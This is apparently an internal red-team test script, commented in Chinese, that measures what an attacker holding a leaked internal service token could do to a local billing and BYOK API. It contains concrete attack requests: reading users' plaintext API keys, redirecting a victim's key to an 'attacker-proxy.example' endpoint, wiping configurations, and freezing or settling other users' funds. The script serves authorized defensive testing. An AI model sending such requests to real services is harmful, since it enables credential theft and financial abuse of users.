#!/usr/bin/env node
// ============================================================
// scripts/security/redteam-billing-compromise.mjs — A2 WRITING 令牌沦陷演练
// 模拟 writing Worker 被打穿：攻击者只持 WRITING_INTERNAL_TOKEN，逐项测出
// 「能/不能」清单与剩余爆炸半径。PASS=守住 FAIL=能打穿（记入爆炸半径）INFO=设计内
// ============================================================

const BASE = process.env.BASE || 'http://127.0.0.1:8790';
const WRITING_TOKEN = process.env.WRITING_INTERNAL_TOKEN || 'dev-writing-token-smoke';
const AUTH_TOKEN = process.env.AUTH_INTERNAL_TOKEN || 'dev-auth-token-smoke';
const results = [];
function record(id, verdict, detail) {
  results.push({ id, verdict });
  console.log(`[${ { PASS: 'PASS', FAIL: 'FAIL', INFO: 'INFO' }[verdict] }] ${id} — ${detail}`);
}
async function req(method, path, body, token = WRITING_TOKEN) {
  const resp = await fetch(BASE + path, {
    method,
    headers: { 'Content-Type': 'application/json', 'X-Internal-Token': token },
    body: body !== undefined ? JSON.stringify(body) : undefined,
  });
  const json = (resp.headers.get('content-type') || '').includes('json')
    ? await resp.json().catch(() => null) : (await resp.text()).slice(0, 120);
  return { status: resp.status, json };
}
const VICTIM = 'u-redteam-victim';
const ATK = 'u-redteam-atk';

console.log('=== A2.0 准备受害者（AUTH 令牌造数：受害者有余额+BYOK）===');
await req('POST', '/admin/balance/set', { userId: VICTIM, target: 500000, note: 'A2 setup', operator: 'redteam' }, AUTH_TOKEN);
await req('POST', '/internal/byok/set', {
  userId: VICTIM, key: 'sk-victim-SECRET-do-not-leak', baseUrl: 'https://api.victim-provider.example/v1',
  model: 'victim-model', visionKey: 'sk-victim-vision-SECRET', visionBaseUrl: 'https://api.victim-vision.example/v1', visionModel: 'vision-model',
}, AUTH_TOKEN);

console.log('\n=== A2.1 只读面：任意 userId 读（WRITING 令牌，设计内信任模型）===');
{
  const w = await req('GET', `/internal/wallet/${VICTIM}`);
  const me = await req('GET', `/internal/me/${VICTIM}?days=30`);
  const us = await req('GET', `/internal/usage/${VICTIM}?limit=10`);
  const ov = await req('GET', `/internal/overview/${VICTIM}`);
  const byokView = await req('GET', `/internal/byok/${VICTIM}`);
  record('A2.1a wallet 任意读余额', w.status === 200 ? 'FAIL' : 'PASS',
    `status=${w.status} balance=${w.json?.balance}（WRITING 沦陷 → 全平台用户余额可枚举，设计内）`);
  const meKeys = me.json ? Object.keys(me.json) : [];
  record('A2.1b me 个人视图任意读（无资金字段越权=设计内）', me.status === 200 ? 'FAIL' : 'PASS',
    `status=${me.status} keys=${meKeys.join(',')}`);
  record('A2.1c usage+ledger 任意读', us.status === 200 ? 'FAIL' : 'PASS',
    `status=${us.status} usage行=${us.json?.usage?.length} ledger行=${us.json?.ledger?.length}`);
  const ovStr = JSON.stringify(ov.json ?? {});
  record('A2.1d overview 任意读', ov.status === 200 ? 'FAIL' : 'PASS',
    `status=${ov.status} 泄密字段=${['baseUrl', 'secretName', 'encrypted_key'].filter(k => ovStr.includes(k)).join('|') || '无'} quota组=${Object.keys(ov.json?.quota ?? {}).join(',')}`);
  const bvStr = JSON.stringify(byokView.json ?? {});
  record('A2.1e byok 状态脱敏（has_key 布尔，无明文/密文 key、无 baseUrl）',
    byokView.status === 200 && !/key"|baseUrl|v1:/.test(bvStr.replace(/has_key/g, '').replace(/agnes_available/g, '')) ? 'PASS' : 'FAIL',
    `status=${byokView.status} body=${JSON.stringify(byokView.json).slice(0, 140)}`);
}

console.log('\n=== A2.2 明文 Key 面：/internal/config/:userId/:modelId ===');
{
  const cfg = await req('GET', `/internal/config/${VICTIM}/byok`);
  const leaked = cfg.json?.key === 'sk-victim-SECRET-do-not-leak';
  record('A2.2a byok config 回读受害者明文 Key+baseUrl', leaked ? 'FAIL' : 'PASS',
    `status=${cfg.status} key=${cfg.json?.key} baseUrl=${cfg.json?.baseUrl}（WRITING 沦陷=全平台用户自备 Key 明文可读，设计内但属最大敏感面）`);
  const dsk = await req('GET', `/internal/config/${VICTIM}/llm:deepseek-flash`);
  record('A2.2b 平台上游 Key 经 config 可读（sk-81aa…本地假 key）',
    dsk.status === 200 && String(dsk.json?.key).startsWith('sk-') ? 'FAIL' : 'PASS',
    `status=${dsk.status} key=${String(dsk.json?.key).slice(0, 8)}…（设计内：writing 调上游必需）`);
}

console.log('\n=== A2.3 写面：/internal/byok/set 篡改受害者 BYOK ===');
{
  // 恶意 baseUrl：劫持受害者后续所有 BYOK 调用（明文 key 会发往攻击者端点）
  const r1 = await req('POST', '/internal/byok/set', {
    userId: VICTIM, baseUrl: 'https://attacker-proxy.example/v1', model: 'victim-model',
  });
  const cfg = await req('GET', `/internal/config/${VICTIM}/byok`);
  record('A2.3a byok/set 改受害者 baseUrl → 劫持后续调用（key 不变）',
    r1.status === 200 && cfg.json?.baseUrl === 'https://attacker-proxy.example/v1' ? 'FAIL' : 'PASS',
    `set=${r1.status} 回读 baseUrl=${cfg.json?.baseUrl} key保留=${cfg.json?.key === 'sk-victim-SECRET-do-not-leak'}`);
  // 响应体是否回读明文 key？
  const r2 = await req('POST', '/internal/byok/set', { userId: VICTIM, key: 'sk-brand-new', baseUrl: 'https://attacker-proxy.example/v1', model: 'm' });
  record('A2.3b byok/set 响应体不回读 Key（仅 {ok:true}）', JSON.stringify(r2.json) === '{"ok":true}' ? 'PASS' : 'FAIL',
    `status=${r2.status} body=${JSON.stringify(r2.json)}`);
  // clear=true 清除受害者 BYOK（DoS）
  const r3 = await req('POST', '/internal/byok/set', { userId: VICTIM, clear: true });
  const cfg3 = await req('GET', `/internal/config/${VICTIM}/byok`);
  record('A2.3c byok/set clear=true 删除受害者配置（DoS）',
    r3.status === 200 && cfg3.status === 404 ? 'FAIL' : 'PASS',
    `clear=${r3.status} config后续=${cfg3.status}`);
  // 非法输入 400 口径（不 500）
  const r4 = await req('POST', '/internal/byok/set', { userId: VICTIM, key: { $gt: 1 }, baseUrl: 'https://x.example', model: 'm' });
  const r5 = await req('POST', '/internal/byok/set', { userId: VICTIM, baseUrl: 'ftp://x', model: 'm' });
  const r6 = await req('POST', '/internal/byok/set', { userId: VICTIM });
  record('A2.3d byok/set 非法输入全 400（对象 key / 非 https / 缺 baseUrl）',
    [r4, r5, r6].every(r => r.status === 400) ? 'PASS' : 'FAIL',
    `${r4.status}/${r5.status}/${r6.status}`);
}

console.log('\n=== A2.4 资金写面：hold/settle/release 任意 userId ===');
{
  const h = await req('POST', '/internal/hold', { userId: VICTIM, project: 'writing', service: 'llm:deepseek-flash', estInputTokens: 1000, maxOutputTokens: 4096 });
  record('A2.4a 对任意受害者冻结资金（hold）', h.json?.mode === 'hold' ? 'FAIL' : 'PASS',
    `status=${h.status} frozen=${h.json?.frozen}（设计内：writing 为用户代冻结；沦陷=可批量冻结受害者资金）`);
  // settle 无归属校验时：不传 userId 也能结算他人 hold —— 但需要知道 holdId（UUID 不可枚举）
  const s = await req('POST', `/internal/holds/${h.json.holdId}/settle`, { promptTokens: 100, completionTokens: 100 });
  record('A2.4b settle 不带 userId 可结算他人 hold（holdId 需已知）', s.json?.charged >= 0 ? 'FAIL' : 'PASS',
    `status=${s.status} charged=${s.json?.charged}（holdId 为 UUID 不可枚举=依赖保密；带 userId 时归属不符 404）`);
  const h1b = await req('POST', '/internal/hold', { userId: VICTIM, project: 'writing', service: 'llm:deepseek-flash' });
  const s2 = await req('POST', `/internal/holds/${h1b.json.holdId}/settle`, { userId: ATK });
  record('A2.4c settle 带 userId 归属不符 → 404', s2.status === 404 ? 'PASS' : 'FAIL', `status=${s2.status} ${JSON.stringify(s2.json)}`);
  const r1b = await req('POST', `/internal/holds/${h1b.json.holdId}/release`, { userId: ATK });
  record('A2.4c2 release 带 userId 归属不符 → 404', r1b.status === 404 ? 'PASS' : 'FAIL', `status=${r1b.status}`);
  const r1c = await req('POST', `/internal/holds/${h1b.json.holdId}/release`);
  record('A2.4c3 release 不带 userId 可释放他人 hold（holdId 需已知）', r1c.json?.refunded > 0 ? 'FAIL' : 'PASS',
    `status=${r1c.status} refunded=${r1c.json?.refunded}`);
  const h2 = await req('POST', '/internal/hold', { userId: VICTIM, project: 'writing', service: 'llm:deepseek-flash' });
  const s3 = await req('POST', `/internal/holds/${h2.json.holdId}/settle`, { userId: VICTIM, promptTokens: 10, completionTokens: 10 });
  record('A2.4d settle 带正确 userId → 正常结算', s3.status === 200 ? 'INFO' : 'FAIL', `status=${s3.status} charged=${s3.json?.charged}`);
  await req('POST', `/internal/holds/${h2.json.holdId}/release`, { userId: VICTIM });
}

console.log('\n=== A2.5 铸币面：WRITING 令牌打 /admin/* 与 webhook（必须全拒）===');
{
  const att = await Promise.all([
    req('POST', '/admin/recharge', { userId: ATK, points: 10_000_000, operator: 'atk' }),
    req('POST', '/admin/gift', { userId: ATK, points: 10_000_000, operator: 'atk' }),
    req('POST', '/admin/balance/set', { userId: ATK, target: 10_000_000, operator: 'atk' }),
    req('POST', '/admin/codes', { points: 10_000_000, count: 1, operator: 'atk' }),
    req('POST', '/admin/orders/manual', { userId: ATK, points: 10_000_000, operator: 'atk' }),
    req('POST', '/webhooks/recharge', { userId: ATK, points: 10_000_000, externalRef: 'atk-x' }, WRITING_TOKEN),
  ]);
  const all401 = att.every(r => r.status === 401);
  record('A2.5 铸币 6 入口全 401（WRITING 不可铸币/不可兑换 webhook）', all401 ? 'PASS' : 'FAIL',
    att.map(r => r.status).join(','));
}

console.log('\n=== A2.6 兑换面：redeem 任意 userId（须持有效码，无码=404）===');
{
  const r = await req('POST', '/internal/redeem', { userId: ATK, code: 'WRT-FAKECODEFAKECODE' });
  record('A2.6 redeem 无有效码不可凭空入账', r.status === 404 ? 'PASS' : 'FAIL', `status=${r.status} ${JSON.stringify(r.json)}`);
}

console.log('\n=== A2.7 quota 面：skipQuota free 通道与 quota 记账 ===');
{
  const r = await req('POST', '/internal/hold', { userId: VICTIM, project: 'writing', service: 'llm:agnes-flash', skipQuota: true, calls: 100 });
  record('A2.7 skipQuota free 通道（零计费 usage 行）', r.json?.mode === 'free' ? 'INFO' : 'FAIL',
    `status=${r.status} mode=${r.json?.mode}（设计内：writing 自管额度，沦陷可灌 usage 行=数据污染非资金损失）`);
}

const nFail = results.filter(r => r.verdict === 'FAIL').length;
console.log(`\n汇总 PASS=${results.filter(r => r.verdict === 'PASS').length} FAIL=${nFail} INFO=${results.filter(r => r.verdict === 'INFO').length}`);
console.log('注：FAIL 在本套件语义 = 「WRITING 沦陷后确能造成该影响」，对应爆炸半径清单，非代码缺陷定级。');
process.exit(0);
